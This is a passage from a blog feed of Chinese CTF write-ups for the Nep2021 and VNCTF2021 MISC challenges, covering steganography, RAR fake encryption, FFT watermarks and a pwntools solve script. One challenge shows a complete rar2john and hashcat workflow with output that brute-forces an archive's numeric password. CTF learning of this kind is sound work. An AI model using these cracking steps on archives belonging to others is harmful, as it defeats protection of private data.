001961839441783370438433332524888952755072832867039562229899392173573353580606101453996017971785110492890103233518666006654441091010777306628401192942553802480194127241303493562250604973075784009007771841370274177808149418825652458156856491836062709242993030265020629565270893072372766252475123700999649400333603526094308829005361507091842135532356536463266979832102425199482313385944078782745555471266946905886911818229551468226593701687145021166521176732270133153258708133382809042442578592219243168751249134837347002782547031127475927820490325693389499997710379922677662230692761811590207110600097677071251835260867376130783566079991453152581322156882263817629990605055912556595367&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;1466462768803722687820990234146153789332776717426574735157342721894173457313793945470995397948053356427400255798986824549142533735653243872935065667283473357648161546021360813391606407358422258488463177267190947790720880067935702278652903629428101039967610738736032763360537325988503316046992497815420149392442185456639217773851126536800303404704906357832735069464476881204164101005831350899734876576455658842071540866658496429523694053741747003274745426660915410875732910009698770028863061692356650150359274502417470145616022187365568348366183555284622003617047953676123255503879408662958850277914455813142457580910929063291960692431164975973248697909727624630170385090818255406971227365813586689855062427882902087409590194133583325138182803031874353720239525341257976991453293716238702606049904809975311181873847202175360574473960210635030683203341524371158272359543342768002682704641639270023106995528115967954614158263176608889238834414979150085710345552582864875273548395511761063104901679126625884770540130127110239251299540382151889587418636217401856273223406736777664731035692208401129541554620276534658936718978867906083660273888852478360656326426348522516050204325765871127922081918524356839561452544240429557671771864300929161623099693525813299169216533966160346052929994327173984258914667358101930622397308183483169850178838924492639185315152609906814955625570811896455006089818390842937336733582587268722512443517634955373752922508533706884558197023941312207821484164116313449042275176450912610267367732036322555879448303078575205784751453502321946890278764349534090837614791907838419293287099943865406547170516726740489446964722410012036556555967932070416519239143966546404023416713865455161926722765793360471879496500828503958488051251210726713698214036252726752887957811379704663037356850400162151317113751028454602541090788271606572708984000539082815639064834898766224260385368930121264466445836747484008130156009288880610457237625764045317543690301274901058450254654602263017522754533808571561150814949056906961341511996779937354884772320065821114957269363368274611297708624271519660854512441426885509896350237251805939970778259430889678574006608136753859840404142026342231687427902144318243382084429667896923184193252430887056592702444454022137403893487669767665660351005504950274132704290455943998846427235946141347169553800927911924353286398496376968565099634844332056371355229384578221800076164170621512726157130214356899574789759718093195135118082774844180281307499695648887081926310963073570400373003906368126732440450380955150116087231718144964332207835674227278000056751337448599567089441718938335281958743765482365111100590619039742235511041300262432959498787424523918512869059510706240190996480183464879967572100198195167462376952422143853314955176499760574685656362642914482179486020613952169810456578542701726428005358201809943863225873729123643314878509035476900560473259425980335521841579400065671829722273467335279301109077753627723421347620528598516236564749222948406616013333981919830915003458200779586548274337503547102219676918439442144257263573807272155202623003956313441230268083475982624622859546209500721900192050944311765428240869308787726176692926966020956918895007303095260780322248180161257398502980490226033599320769833471972587073463713330851274204567915760444570046332183071746896173290833314571417453631617049654276903115010145030258664163945359454008944575669041922816925525989390345270907544737781268862270002859816424663306327644213071450917624028760639368439510039391179322408733786094474873541571068690093479803341479746458972459944518289705044943429687199015131659642424704585268483234784277200350564944835502249696934078614051140763153047275086153077133831386679260343859202464542254145393519032481125509033066968402752476506859283886797956989432400654527254724804539151017004378989227091548671276650109132082892293473239439873288210616004718137202001522782415787670607477172980776641975376907824813740753900858881163073009973675497411327475759484661994433541027118478477873203801285348520794633328592657263505999991128879668520585720428622237742490512537950359402205324001995495074505807089644668448393383213154048818981685410508280672403006942175254143340620979643541341540074337572659622703360744479191758526561879748065269225331493156319797202196698953093091118268663180285453994173175004765042540875901896560172126805963396790075724648861284061587949206539942962129412131995287496570144629907257102335817747474586134616799127347111891708334557715358473749128447523960311368632111187524169171349903681252047364790356294740543040289664587755687750107722774759862119191799852175001489149275860198133527599004010589703785960337252846734341350955273111125113685791268561493953580889137093318460379114925753926139452652678469214058672198208237080575292099030434720230371019151930821777059596403590137514162396944094077882663593602532834157681855429204563684714007140790471341731865660059139398388366172399274776878238470590564900337146592840055286970658590626056064774635037184621116150135854418956354510228350086920816992573510920569142525094101331103865716360093037599947187352903338592828664415300111098987525354000528988539370713205032546695346298781626827639615547289652649948996485550687407583089787140208368014043142638420083431583735065909488869448639307088567210131319590284847238355714331037717182304377120888237618040993668130877092086293688186390937832034765693427660886462975244457222485897333426083174195975863029051784841114606257147096809874368016484207233438338509864968&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;47622450400948378838383772282463774606862475585470916135643120242889164588999536917143252778898237971519642050232275519904346077796804164997665170205968559976309128127925359988920951940206912919554809735600309714561600669180191562523906954373442895286177820090074271444866144401506681728848985841518809813817744245369156604056715252134781651290696247931418719827721409603298669191348612295024182755007100463679890698670970772218604919944523548556339943990850928329334044482351470144751278631230052483209229192136090007700973362792766305057772210218843096395204004481827871813127982371104261927151640854476471691258603962738116589877882203513684178221638481443997120721426951288321845195709538874283311496775212472633043757016949413544955089450529970071115171319204455757146236186283669069688840344104909843453532933741359090255143237887602089268418356097385230465055288442812353852678109364557896410605519305061329809194582847670449343808895801066484058241857852557025853970470346734297512391305668724507609507860997210910249828839975095498003479392729012450557551501558320236220920957164255349717391566888082337651296824625293758028502677596286857109601061747560818473556222963976245224436029590094669629286031110344430825748468172810347309875610823148486669786946210224096523266839596074611763758157557664013300435818412520127102295208939189906585620396212651765699761291878071263904189401224066323142807351350771288944210158279686921742294747307474233600865491069252006522535488189377697928025125557621379549255290434908346038130268791214288761888173148344653009237658149639465258186543795913644724483967167271354216410857782569840456443439191163524988860419550058863439011112647571765143098332645498985654541702199457567021375604151698069751565059399207164022611522991554954322337382634649727285217129423673370394965121067239894366149581109228445711919745882281342614646173496777927189158828873291373360559493626235980310503651954583446014359765608056405680697149732429212383292427158489912859600560764546409487137797434433280391746835155157023613387021771257903833401416657254712158341427482279548188517245020827649635343698774804958039887874677668293792752410148798450853470012738072908329266410979821696916469513375891863148739598334904827404460820947224418582238623488603934818365623881078631861542509103895074183496885978299923729454828974760861965227627240219823926287218746031610309230743922733682874795150985436217330699586340400912320670388975069961195118990128872085568496625327692693432900622868904887568511422015928091397130006637366088807249451579584296668364743256869381706306860780375897099571626209545626485944716947896464577148689231222737379171911134294203436527612713553746799327282889817221830528744366228624963184335138436843991411220561872387514837317617725088051768758821799717134972056130662827963575852075195983333237812361469358928050372207865758118382197475583604897923869874443254558509491089094497114309187515435417626768692338314768879199254962134071364892503433291512653074139512155522589222479395052657948150741190520214628284891464936780162688434679291410736556884486773696840381406282032875195723530086887753071363641544299638554503482403044827489580056913943422699970704859738311408892499707908489253243553716995417910394398094100749297597547580211158200206330030361004088378215696877933199873683522779889198901930937215425097187656672830486004822490294320139664485427561504232130257623519683347400842087756573452879355666822274541394819212535164620698017642540024964879529442496467620788094786440378476823695293501722495338784621644962662327864386529025226531680747525116663651083867870952664381887535020135683653867535500764985777586994135175757313800702085306105423536196873700543907429173383740071355554433235790028028913063521657396875545515280730719253230768312689362173644652095812428829060569326084255919425957186992895406713009973532453651237396275339660722984857993571948014177882269245678789940694598886067003485062545812158114223243596985982981053929849377362932912968592983160821938296512313053406706366570551134248607106838991076299811097232369731983873397568183604741730679477708228043724274236971655276883587537538807463933248573056764890328937147993552897863908422809744532916448505130307316345603250021629200966979727553566898848418212050469040462774067434279504303064273954443870971451129233529449800530988407135418019143122293348275498630841723639872063348515200353880053898537816522858218623188622751826735048654693126489566783502051135681427010709684649132264136843643574234222127181277585421920287397212371635900068620872015237701184536167275969863375956410621166928239826276150733735560005835242757705026050498056686664492317443869890115549535953605656840319187701634496815261905403829900411155129186253431300704606916547191143757850974622268610491295742185729093409192567569751484195005154100683306654779007665669728792963209833514009497910233070844858781637129847244418735700272643945288880602248591506142020110809954124229243650347853949950615679125504309603268168970087780082752748418531873061421099344561758754414122646701643857380924441570725935144434391134626028509815913280036817355699592050233801080040353249527134723579200097042105263761350123881231422906878938655350539034665984543299464199719993288263333879987368133210745062241607017400289127218733968733124756652452939417370203706536373812620169103207477941223978551834048584046637279693226304436911401963976815152363999340062727737206096822311985120175950512924402251872044716022462706876189642892600376531572498967&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;6692730096259452643369104960627455630486215862399671626732511651080481725914118043331962481949887246701616498356166181463604926787704653729996524875944166464259834513341705159840317679808261520484528369303565687257064907833628722706736890217964224422223998452334667877204269030436124986535368385034217958050214758008075705340244612677399960920232432270936246267613432813660990366567228079750807890066079611266367346864160511628226289909730940074689153001802775046666179052632981030614614169569391452067758516455221647484030999554706461123791807054670937722216527237831406838479377545766845200930604834889512899500298890279463693292123492722332964766293920612462482832346906579356853165719135718614757414077012806506891804144857723803907676032689642786952845709990953932549363099277202376455866403343511636096090375135224056359990162308934493705571731817161204022064082776683415625288907335128227482210147359946199187596915617399127457890619731551245662573544480434303562880059763371510761927915895906816154741217474757012037948333052450948476074779692568524946903249315558861221338345333707757506558596252170626033347982508660529595727154556214962133515612611016236612647370563803336371277474122183675326321775888376588019649186941050457093330574306006986097505564912850747944195881019554947202505040052804598375384739818930341354578533986322895086376858707463392009316120030250126712526017586828270649304748716858128207666637663463616763441471078140139397165398583082792700730916946522609308347804497092788797288655742983063401287929657658976022731909898318616931557751739391419299632140075177345562777607172891334227363324171818253438628193523635359638830124084206940507156748690007173906158332911198479931217612571332175228285424725788618932441123312056841558681171044031534689729724691692912359887866667930883571803897811767970302335614219823583212530946330960425630170759880575140525980655912864408561070271281256235441915992173078282832751522617530913457332359506998401455770170148507223571372814959845223749946250391821473437923170419836829629573389065359875395735969558797082534386336670004171504123398260118906657430620905923442497543912091623694459665406533851295585577716831411779117126645622931046613934399425097865071551562607352459925632847376933960796535324837598687628712655007121426904118192945265333766905073914839487266825952061145886314105700264580892659214832501756632175256329239482959935590623864400784418843182077217334193177197696837594211308483641010337802908540807811308881492169321137882307683712433297499007946781116061320458705721560125360842061486428850165801712957979595359246728776430639245939636738948374761658954061826209691051920957797067434218054572681739182471133280523370552885267688527726127135134270330852701348584033118514142382336116407399008075996860982473510530346022361230317172840057578686001163210274329974595126286187269014026433799441121386883231381984306214840014935709084077222504721973335222668527808855559610990711488108899107512957141381420732916565500896920478134482742963861647524468723317202105177122047589163963776903970183491643712078839753127169721419656802120034479275632337807924544614498110240363188487068594679650721290227877054858558111252685500296470242670684134891258621448609138267737182763032469423691128748192585991339150082774098556015718505017431352118078322619870689991014115031741711290769496089014977880570263266405690441911703781396906998762963587612999641290185250072869170440998075953692342671487460709193956045971969356326209070905623784688123412057499359044056826754728447850124347648398710550218154116952578196233513878798252059822638656328544635582956335584231888174374941455674902151097107216854418487873371668727710211558581171277145725681652074404567177285568687595945357490783390784232306424563694736533020608498181464646971181770196876384953469622440846514006232384210961579158336899260081585536468500934980497170535612446252975896695526200287578712298314622454508448363640890747229139443768079583177480872178042259050166177688625276376213463703266639188395613252991270000795977687386423737853169071311746970345634184517790850697224560536919249448868582994389668475556905130571202552218257473659915042192852883158829520722740650513765041860440266491282066812530716688774135015932473130727413733116681785660017420242862228536599943421961099282741943719358222072007939854053509521905735912191309088131695308739956798885671694328458098321491372884169420463319900482341649820798039294107822946250917886176746645780913148275745781620821252781169313295613808543152058629071010936935426042544003657991023530442000967140490604075975244178975806038991746932562976007960411034074895087917279784536437641619888646710861410596842178036218663126583685587080880228752877783782319015943806200498797807843784497766965338186516923592678329622986749043139097599188984217640583316895265361154438849767555629158421509916829272788880623767533583482040026964428256454562903529935552136541947137147274973714527471950166304339163636952976732589610760660374407640321978111107637740755852017091520655110597205198842248308933217962442651853490174911403756247603565731181111671683928302166630842756928837169769877128819926602478968210662873624252901764427943619832956659552493674351362220715335865324112698992725740083263995933814196117674869528535175868791264054216712326268429406736707035618273426834172587106600230739062978250941965654621128900832876783234653461887966954026005333565342496743505345812402536575799940100433925667207864266152565347803725841484762656261514597525355&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">print(p)</span><br><span class="line">#flag is: flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021数字中国创新大赛虎符网络安全赛道&quot;&gt;2021数字中国创新大赛虎符网络安全赛道&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;你会日志分析吗&quot;&gt;你会日志分析吗&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;线索只有一份a</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Nep2021</title>
    <link href="http://mklkx.github.io/2021/03/25/Nep2021/"/>
    <id>http://mklkx.github.io/2021/03/25/Nep2021/</id>
    <published>2021-03-25T07:43:21.000Z</published>
    <updated>2021-05-04T11:38:59.436Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1">1</span></h3><h4><span id="涅普冬令营misc签到"></span></h4><blockquote><p>sharun：这题有很多解啊</p></blockquote><p>本次涅普MISC的感受是，考点不难，只要找到点和合适的工具就能出。恍然大悟</p><p>签到题是这样的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D;[0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffff</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>第一次尝试可能是异或，想了想后发现如上所示，大部分是0xf，是相同的字符，奇怪</p><p>第二次尝试直接转十六进制，全是不可见字符，失败</p><p>第三次觉得可能是纯几何的图案题：</p><p><img lazyload src="/images/loading.svg" data-src="654SJK.png" alt="654SJK"></p><p>但是总觉得差一口气</p><p>第四次尝试回到了第二次的思路，进制转换看看。</p><p><img lazyload src="/images/loading.svg" data-src="65hXZR.png" alt="65hXZR"></p><p>看不出来名堂，便开始玩了。</p><p><img lazyload src="/images/loading.svg" data-src="65hvIx.png" alt="65hvIx"></p><p>有意思嘿。隐隐约约能看到NEP字样。</p><p>把内容移到sublime</p><p>因为它的文字内容能够根据应用边距的变化而变化。</p><p>不断调整</p><p><img lazyload src="/images/loading.svg" data-src="65hzi6.png" alt="65hzi6"></p><p>看到希望了！</p><p><img lazyload src="/images/loading.svg" data-src="65hjd1.png" alt="65hjd1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep&#123;Y0u_ar3_50_cl3ver!&#125;</span><br></pre></td></tr></table></figure><p>解出来之后想起一道相似的入门题。</p><h3><span id="2">2</span></h3><h4><span id="涅普冬令营出题人日记"></span></h4><blockquote><p>我把茶包的出题日记找到了，里面居然有！！！</p></blockquote><p>得到出题人日记.zip</p><p>解压得xlsx</p><p>根据经验更改后缀为.zip</p><p>winrar打开看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">隐写.wf pna fbyir guvf ceboyrz</span><br></pre></td></tr></table></figure><p>怀疑栅栏</p><p><img lazyload src="/images/loading.svg" data-src="65Tv80.png" alt="65Tv80"></p><p>打开/xl</p><p><img lazyload src="/images/loading.svg" data-src="65TO5n.png" alt="65TO5n"></p><p>在shareStrings.xml里看到日记内容</p><p>重点在于：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;菜鸡的第十八天日记&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;前言：好像是这个女人，但是又好像不是这个女人诶，我好像找到她了！&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;rot13是个好东西不是吗？&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;flag在里面啦！！！大佬们再找找？？？&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;出题第十八天&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;高兴&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-&lt;si&gt;</span><br><span class="line"></span><br><span class="line">&lt;t&gt;我好像找到了这个女人了，终于问到师傅们菜鸡可以出什么题了，她跟我说她叫fufu，然后让我把flag藏到她身上，好像很有道理的样子诶，这就把flag交给她！&lt;&#x2F;t&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;si&gt;</span><br></pre></td></tr></table></figure><p>依次处理</p><p>上述文本rot13后：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">隐写.js can solve this problem</span><br></pre></td></tr></table></figure><p>在/media里得到几张图片</p><p><img lazyload src="/images/loading.svg" data-src="65TO5n.png" alt="65TO5n"></p><p>fufufufufufufufufuufufufufufufufufufufufufufufufufu.flag查看二进制后，更改后缀为.png</p><p>得到与image3.gif第一帧相同的图片，猜想盲水印。对比无果。</p><p>卡了很久。</p><p>尝试js隐写，查询【png隐写js】类似关键字无果。</p><p>突然想到，隐写=steganography，隐写.js=steganography.js</p><p>查询搜索引擎得</p><p><a class="link" href="http://www.peter-eigenschink.at/projects/steganographyjs/showcase/">http://www.peter-eigenschink.at/projects/steganographyjs/showcase/<i class="fas fa-external-link-alt"></i></a></p><p>秒出</p><p><img lazyload src="/images/loading.svg" data-src="65TjCq.png" alt="65TjCq"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep &#123;D4La0_s0lve_th1s_probl3m_to_hit_c4ij1&#125;</span><br></pre></td></tr></table></figure><h3><span id="3">3</span></h3><h4><span id="make_hsy_great_again">make_hsy_great_again</span></h4><blockquote><p>Q师傅是韩商言的粉丝，前段日子他刚组装了台新电脑，并且要求我帮他装系统，我在他电脑里发现了这个。</p></blockquote><p>得到加密的make hsy great again_.rar</p><p>rar5用hashcat</p><p>第一步：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#rar2john hsy.rar</span><br><span class="line">&gt;hsy.rar:$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2</span><br></pre></td></tr></table></figure><p>第二步：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --force -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>开始爆破</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2:520233</span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: RAR5</span><br><span class="line">Hash.Target......: $rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98...8772c2</span><br><span class="line">Time.Started.....: Thu Mar 25 14:36:44 2021 (14 mins, 55 secs)</span><br><span class="line">Time.Estimated...: Thu Mar 25 14:51:39 2021 (0 secs)</span><br><span class="line">Guess.Mask.......: ?d?d?d?d?d?d [6]</span><br><span class="line">Guess.Queue......: 1&#x2F;1 (100.00%)</span><br><span class="line">Speed.#1.........:      262 H&#x2F;s (6.99ms) @ Accel:512 Loops:128 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1&#x2F;1 (100.00%) Digests, 1&#x2F;1 (100.00%) Salts</span><br><span class="line">Progress.........: 233984&#x2F;1000000 (23.40%)</span><br><span class="line">Rejected.........: 0&#x2F;233984 (0.00%)</span><br><span class="line">Restore.Point....: 23040&#x2F;100000 (23.04%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:6-7 Iteration:32768-32799</span><br><span class="line">Candidates.#1....: 525587 -&gt; 516587</span><br></pre></td></tr></table></figure><p>密码【520233】，得到【hhhhhhsy.png】</p><p>通过010editor看到格式</p><p><img lazyload src="/images/loading.svg" data-src="hsy.jpg" alt="hsy"></p><p>结合png格式，编写倒置函数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Untitled1&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line"></span><br><span class="line">        g.write(f.read()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>得到另一张图片【flag.png】，表面看跟已知图片一样，丢进Beyond Compare 4</p><p>对比两张图片，得到</p><p><img lazyload src="/images/loading.svg" data-src="hsy2.jpg" alt="hsy2"></p><p>根据提示【flag{too_young_too_simple hint Crypto}】</p><p>找到hint Crypto脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">    a = im.getpixel((<span class="number">2069</span>,j))[<span class="number">3</span>]</span><br><span class="line">    flag += <span class="built_in">str</span>(a)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nep&#123;Qfrost_l0v3_hsy_v3r7_m0ch&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;1&quot;&gt;1&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;涅普冬令营misc签到&quot;&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;sharun：这题有很多解啊&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本次涅普MISC的感受是，考点不难</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2021</title>
    <link href="http://mklkx.github.io/2021/03/24/VNCTF2021/"/>
    <id>http://mklkx.github.io/2021/03/24/VNCTF2021/</id>
    <published>2021-03-24T07:32:05.000Z</published>
    <updated>2021-05-04T11:39:39.242Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="1">1</span></h3><h4><span id="vnctf-2021冰冰好像藏着秘密">[VNCTF 2021]冰冰好像藏着秘密</span></h4><blockquote><p>发现冰冰藏着的flag，flag格式为VNCTF{*}</p></blockquote><p>得到FFT.rar</p><p>但是直接打开会提示</p><p><img lazyload src="/images/loading.svg" data-src="FFT.jpg" alt="FFT"></p><p><img lazyload src="/images/loading.svg" data-src="FFT2.jpg" alt="FFT2"></p><p>这个存在一个考察的点：rar伪加密</p><p>但是在实战中笔者发现两个绕过的方法</p><p>1)用kali打开</p><p>2)如上图图二所示，在winrar报错的情况下，直接拖出FFT.png，也能达到解压的效果</p><p>而按出题人本身的意思，是在使用010打开的情况下：</p><p>把下图的84改成80</p><p><img lazyload src="/images/loading.svg" data-src="FFT3.jpg" alt="FFT3"></p><p>第二步：</p><p>1)隐形水印工具也能得到水印：</p><p><img lazyload src="/images/loading.svg" data-src="FFT6.jpg" alt="FFT6"></p><p>放大可以看到flag</p><p>2)通过搜索得知文件名FFT为：</p><p><img lazyload src="/images/loading.svg" data-src="FFT4.jpg" alt="FFT4"></p><p>下面是大佬脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;FFT.png&#x27;</span>, <span class="number">0</span>) <span class="comment">#直接读为灰度图像</span></span><br><span class="line">f = np.fft.fft2(img)            <span class="comment">#做频率变换</span></span><br><span class="line">fshift = np.fft.fftshift(f)     <span class="comment">#转移像素做幅度谱</span></span><br><span class="line">s1 = np.log(np.<span class="built_in">abs</span>(fshift))<span class="comment">#取绝对值：将复数变化成实数取对数的目的为了将数据变化到0-255</span></span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;original&#x27;</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s1,<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="FFT5.jpg" alt="FFT5"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VNCTF&#123;Ff5_1S_bEauTiful&#125;</span><br></pre></td></tr></table></figure><h3><span id="2">2</span></h3><h4><span id="vnctf-2021happynewyear">[VNCTF 2021]HAPPYNEWYEAR</span></h4><blockquote><p>祝大家牛年快乐！牛转钱坤！(flag为VNCTF{}）Hint1:<a class="link" href="https://www.dcode.fr/tools-list#symbols">https://www.dcode.fr/tools-list#symbols<i class="fas fa-external-link-alt"></i></a>Hint2:stegpy，但是不是那么白给的stegpy</p></blockquote><p>得到加密压缩包和password.png</p><p>可以看出png里藏着古典密码，结合hint1，找到相应的加密方法：</p><p>Chinese Code&amp;Sheikah Language</p><p><img lazyload src="/images/loading.svg" data-src="HAPPY1.jpg" alt="HAPPY1"></p><p><img lazyload src="/images/loading.svg" data-src="HAPPY2.jpg" alt="HAPPY2"></p><p>组合得到压缩包密码：</p><p><img lazyload src="/images/loading.svg" data-src="Inkedpassword_LI.jpg" alt="Inkedpassword_LI"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f87840bdddcc01e4</span><br></pre></td></tr></table></figure><p>打开压缩包，得到happynewyear.png</p><p>接下来就是stegpy的内容</p><p>stegpy工具的安装：</p><p><a class="link" href="https://blog.csdn.net/weixin_45728976/article/details/109018040">https://blog.csdn.net/weixin_45728976/article/details/109018040<i class="fas fa-external-link-alt"></i></a></p><p>附上改动后的出题人脚本，实现爆破</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import os</span><br><span class="line">from subprocess import Popen,PIPE</span><br><span class="line">import sys</span><br><span class="line">def checkwebp(pic):</span><br><span class="line">    print(&quot;IF you don&#39;t need a password for the pic please input 1&quot;) # 无密钥</span><br><span class="line">    print(&quot;IF you know the password of the pic please input 2&quot;) # 有密钥且已知</span><br><span class="line">    print(&quot;IF not input 3 I will use the password.txt&quot;) # 有密钥但未知</span><br><span class="line">    choice &#x3D; input()</span><br><span class="line">    if choice &#x3D;&#x3D; &#39;1&#39;:</span><br><span class="line">        os.system(&quot;stegpy &#123;&#125;&quot;.format(pic))</span><br><span class="line">    elif choice &#x3D;&#x3D; &#39;2&#39;:</span><br><span class="line">        print(&quot;INPUT THE password:&quot;)</span><br><span class="line">        password &#x3D; input()</span><br><span class="line">        cmd &#x3D; [&quot;stegpy&quot;, &quot;-p&quot;,pic]</span><br><span class="line">        subp &#x3D; Popen([sys.executable, &#39;-c&#39;, &#39;import pty, sys; 